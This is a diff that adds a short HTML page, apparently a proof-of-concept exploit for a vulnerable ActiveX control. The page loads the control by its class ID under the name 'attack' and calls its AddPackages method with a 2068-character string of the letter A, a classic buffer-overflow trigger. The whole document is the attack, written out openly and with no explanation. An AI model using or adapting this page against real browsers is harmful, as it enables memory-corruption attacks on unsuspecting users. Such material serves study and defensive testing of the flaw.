@@ -1,0 +1,7 @@
+&lt;html&gt;&lt;body&gt;
+&lt;object classid=&#039;clsid:A9C8F210-55EB-4849-8807-EC49C5389A79&#039; id=&#039;attack&#039; /&gt;
+&lt;script&gt;
+pDirectory=String(2068, &quot;A&quot;)
+attack.AddPackages pDirectory
+&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;
